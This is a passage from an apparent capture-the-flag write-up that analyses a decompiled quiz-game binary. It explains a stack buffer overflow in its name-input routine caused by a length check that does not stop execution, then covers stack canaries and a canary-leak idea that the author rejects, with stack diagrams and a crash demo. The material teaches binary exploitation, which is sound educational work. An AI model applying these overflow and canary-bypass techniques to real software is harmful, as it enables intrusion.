</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">get_player_name</span>(<span style="color:#078;font-weight:bold">int</span> param_1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> cVar1;
</span></span><span style="display:flex;"><span>  ulong __nbytes;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  undefined local_48 [<span style="color:#f60">16</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>local_38;
</span></span><span style="display:flex;"><span>  undefined8 local_30;
</span></span><span style="display:flex;"><span>  undefined8 local_28;
</span></span><span style="display:flex;"><span>  ulong local_20;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_10;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
</span></span><span style="display:flex;"><span>  local_38 <span style="color:#555">=</span> (<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>)<span style="color:#f60">0x0</span>;
</span></span><span style="display:flex;"><span>  local_30 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  local_28 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  local_20 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;Congratulations! You</span><span style="color:#c30;font-weight:bold">\&#39;</span><span style="color:#c30">re going to the SCOREBOARD!&#34;</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;How long is your name (0-31)?&#34;</span>);
</span></span><span style="display:flex;"><span>  cVar1 <span style="color:#555">=</span> readline(local_48,<span style="color:#f60">0x10</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (cVar1 <span style="color:#555">==</span> <span style="color:#c30">&#39;\x01&#39;</span>) {
</span></span><span style="display:flex;"><span>    __nbytes <span style="color:#555">=</span> atou64(local_48);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (<span style="color:#f60">0x1f</span> <span style="color:#555">&lt;</span> __nbytes) {
</span></span><span style="display:flex;"><span>      puts(<span style="color:#c30">&#34;Name too long! No SCOREBOARD for you.&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;Now type in your name:&#34;</span>);
</span></span><span style="display:flex;"><span>    read(<span style="color:#f60">0</span>,<span style="color:#555">&amp;</span>local_38,__nbytes);
</span></span><span style="display:flex;"><span>    local_20 <span style="color:#555">=</span> local_20 <span style="color:#555">&amp;</span> <span style="color:#f60">0xffffffffffffff</span>;
</span></span><span style="display:flex;"><span>    strcpy(game_names <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)param_1 <span style="color:#555">*</span> <span style="color:#f60">0x20</span>,(<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>)<span style="color:#555">&amp;</span>local_38);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (local_10 <span style="color:#555">!=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    __stack_chk_fail();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>This method will be used to store our name in the scoreboard, where we will need to send our name as the input, and the scoreboard will be updated. There is something wrong with this method. Let&rsquo;s see the <code>get_player_name</code> method, especially on the below LOC.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;Congratulations! You</span><span style="color:#c30;font-weight:bold">\&#39;</span><span style="color:#c30">re going to the SCOREBOARD!&#34;</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;How long is your name (0-31)?&#34;</span>);
</span></span><span style="display:flex;"><span>  cVar1 <span style="color:#555">=</span> readline(local_48,<span style="color:#f60">0x10</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (cVar1 <span style="color:#555">==</span> <span style="color:#c30">&#39;\x01&#39;</span>) {
</span></span><span style="display:flex;"><span>    __nbytes <span style="color:#555">=</span> atou64(local_48);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (<span style="color:#f60">0x1f</span> <span style="color:#555">&lt;</span> __nbytes) {
</span></span><span style="display:flex;"><span>      puts(<span style="color:#c30">&#34;Name too long! No SCOREBOARD for you.&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;Now type in your name:&#34;</span>);
</span></span><span style="display:flex;"><span>    read(<span style="color:#f60">0</span>,<span style="color:#555">&amp;</span>local_38,__nbytes);
</span></span><span style="display:flex;"><span>    local_20 <span style="color:#555">=</span> local_20 <span style="color:#555">&amp;</span> <span style="color:#f60">0xffffffffffffff</span>;
</span></span><span style="display:flex;"><span>    strcpy(game_names <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)param_1 <span style="color:#555">*</span> <span style="color:#f60">0x20</span>,(<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>)<span style="color:#555">&amp;</span>local_38);
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></td></tr></table>
</div>
</div><p>The first thing to notice is that these LOCs will:</p>
<ul>
<li>Ask you the size of your name</li>
<li>Check whether the size is &lt;= <code>0x1f</code></li>
<li>Read your name and put it in the local variable in the stack called <code>local_38`` (placed in </code>rbp-0x30`)</li>
</ul>
<p>But, notice that there is a <strong>buffer overflow bug</strong> in these LOCs. In case you haven&rsquo;t known yet, <a href="https://en.wikipedia.org/wiki/Buffer_overflow" target="_blank" rel="noopener">Buffer overflow</a> is a type of security bug where due to an incorrect bound check, the attackers can write more data than it is supposed to be so that they can overwrite adjacent values that aren&rsquo;t supposed to be able to be overwritten. For example:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Let say we have a stack like below, and we have 2 local variables &#34;x&#34; and &#34;y&#34;,
</span></span><span style="display:flex;"><span>where the size of the &#34;x&#34; variable supposed to be 0x10 only
</span></span><span style="display:flex;"><span>Lower Address
</span></span><span style="display:flex;"><span> ----------------------------------
</span></span><span style="display:flex;"><span>| ........                         | &lt;- x variable location in stack
</span></span><span style="display:flex;"><span>|----------------------------------|
</span></span><span style="display:flex;"><span>| ........                         |
</span></span><span style="display:flex;"><span>|----------------------------------|
</span></span><span style="display:flex;"><span>| other values                     | &lt;- y variable location in stack
</span></span><span style="display:flex;"><span> ----------------------------------
</span></span><span style="display:flex;"><span>Higher Address
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Due to buffer overflow bug during reading &#34;x&#34; value, we are allowed to write let say input with size 0x18.
</span></span><span style="display:flex;"><span>Now, due to this bug, &#34;y&#34; variable is got overwritten even though it shouldn&#39;t be overwritten. Below is the
</span></span><span style="display:flex;"><span>stack condition after we send &#34;a&#34;*0x18 as the input
</span></span><span style="display:flex;"><span>Lower Address
</span></span><span style="display:flex;"><span> ----------------------------------
</span></span><span style="display:flex;"><span>| aaaaaaaa                         | &lt;- x variable location in stack
</span></span><span style="display:flex;"><span>|----------------------------------|
</span></span><span style="display:flex;"><span>| aaaaaaaa                         |
</span></span><span style="display:flex;"><span>|----------------------------------|
</span></span><span style="display:flex;"><span>| aaaaaaaa                         | &lt;- y variable location in stack and got overwritten
</span></span><span style="display:flex;"><span> ----------------------------------
</span></span><span style="display:flex;"><span>Higher Address
</span></span></code></pre></td></tr></table>
</div>
</div><p>Back to the LOCs, notice that there is actually a bound check to make sure that the inputted size by the user is less than or equal to <code>0x1f</code>, so that user isn&rsquo;t able to write data larger than the defined size.</p>
<p>However, after they print the warning message, the if block logic doesn&rsquo;t return or stop the method, instead it will goes outside the if block and still continue reading the input, which makes buffer overflow is still possible. This improper bound checking leads to the buffer overflow bug, where we can simply set a large size, and then we can overwrite not only the name variable but also the other values whose address is higher than the name variable.</p>
<p>Now, if we are able to use this buffer overflow bug, we can modify the program flow and get our RCE. Usually, if we have a buffer overflow bug in the stack, our common target is to overwrite the saved return pointer at the bottom of the stack (<code>rbp+8</code>). If you still don&rsquo;t know how to use BOF to perform RCE, it&rsquo;s okay. I will try to explain the detail on this later during crafting our exploitation plan.</p>
<p>By overwriting the saved return pointer, we will have full control of the execution flow of the vulnerable binary. In this case, our name variable is placed in <code>rbp-0x30</code>, so to overwrite the return pointer, we will need to set the input size to at least <code>0x38</code>.</p>
<p>However, looking through the code, this binary has already done mitigation from buffer overflow bug by having a <code>canary</code> to prevent stack smashing. Below LOCs is the conditional logic to check the <code>canary</code> value:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (local_10 <span style="color:#555">!=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    __stack_chk_fail();
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></td></tr></table>
</div>
</div><p>In case you didn&rsquo;t know what that is, <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries" target="_blank" rel="noopener">canary</a> is a secret value that is placed near the stack return pointer (<code>rbp-8</code>). The purpose of this is to detect whether buffer overflow is performed or not. How to detect it? Well during sending our buffer overflow payload to overwrite the stack return pointer, because <code>canary</code> is placed before the return pointer, that means if we try to overwrite the return pointer of the stack, by default the <code>canary</code> will be overwritten also. And then before jumping to the new return pointer, the binary will check whether the <code>canary</code> in the stack is correct or not (compared to the stored value in <code>fs</code> register), and then return <code>Stack smashing detected</code> if this value is changed from the stack. Below is the example demonstration:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Round 12
</span></span><span style="display:flex;"><span>How much is 1 + 2 ?
</span></span><span style="display:flex;"><span>0
</span></span><span style="display:flex;"><span>Wrong! Game Over!
</span></span><span style="display:flex;"><span>Congratulations! You&#39;re going to the SCOREBOARD!
</span></span><span style="display:flex;"><span>How long is your name (0-31)?
</span></span><span style="display:flex;"><span>60
</span></span><span style="display:flex;"><span>Name too long! No SCOREBOARD for you.
</span></span><span style="display:flex;"><span>Now type in your name:
</span></span><span style="display:flex;"><span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
</span></span><span style="display:flex;"><span>Stack smashing detected - mischief not managed!
</span></span></code></pre></td></tr></table>
</div>
</div><p>The above example happened due to our example buffer overflow input, where the <code>canary</code> value got replaced with <code>aaaaaaaa</code>. So, how do we usually bypass this? The answer is simple. We need to know the <code>canary</code> value so that we can carefully craft our payload. After that, when we do buffer overflow, we can place the <code>canary</code> value in our payload before our overwritten return pointer, so that when the binary does the <code>canary</code> check, the check will be passed. So, to do this, we need a way to leak the <code>canary</code>.</p>
<p>A common idea to leak it would be to overflow our inputted name until just before the canary (stop at <code>rbp-0x8</code>), so that the <code>canary</code> will be included as part of our name on the scoreboard. To give an illustration, consider this LOC in the <code>game</code> method:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>strcpy(game_names <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)param_1 <span style="color:#555">*</span> <span style="color:#f60">0x20</span>,(<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>)<span style="color:#555">&amp;</span>local_38);
</span></span></code></pre></td></tr></table>
</div>
</div><p>The above LOC will copy our inputted string to <code>game_names</code> until it found a null terminator <code>\x00</code>. The idea is to overflow our name and stop just before the <code>canary</code> value so that the null terminator <code>\x00</code> detected by <code>strcpy</code> will be null after <code>canary</code> value. Example:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Suppose that the stack layout is like below, where:
</span></span><span style="display:flex;"><span>- 0x7fffffffdb10 = address of our input
</span></span><span style="display:flex;"><span>- 0x7fffffffdb38 = our canary value
</span></span><span style="display:flex;"><span>0x7fffffffdb10:	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x7fffffffdb20:	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x7fffffffdb30:	0x0000000000000000	0xdfe0586beeff1337
</span></span><span style="display:flex;"><span>0x7fffffffdb40:	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>If we overflow our input until 0x7fffffffdb37, the stack will be like below:
</span></span><span style="display:flex;"><span>0x7fffffffdb10:	0x6161616161616161	0x6161616161616161
</span></span><span style="display:flex;"><span>0x7fffffffdb20:	0x6161616161616161	0x6161616161616161
</span></span><span style="display:flex;"><span>0x7fffffffdb30:	0x6161616161616161	0xdfe0586beeff1337
</span></span><span style="display:flex;"><span>0x7fffffffdb40:	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>And when the strcpy got called, it will copy our name together with the canary,
</span></span><span style="display:flex;"><span>because the null terminator is found in 0x7fffffffdb40
</span></span></code></pre></td></tr></table>
</div>
</div><p>However, notice that <strong>we can&rsquo;t do this</strong> to leak the <code>canary</code>, because this LOC in <code>game</code> method <code>local_20 = local_20 &amp; 0xffffffffffffff;</code>, which is placed just before the <code>strcpy</code> LOC, and it will always set a null terminator (<code>\x00</code>) on <code>0x20</code> from our inputted name address before doing the <code>strcpy</code>. So, even though we can overflow the inputted name, the stored name copied to the scoreboard will be only our first <code>0x1f</code> characters, which implies that the above idea is a pitfall idea. See the illustration below to understand it better:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
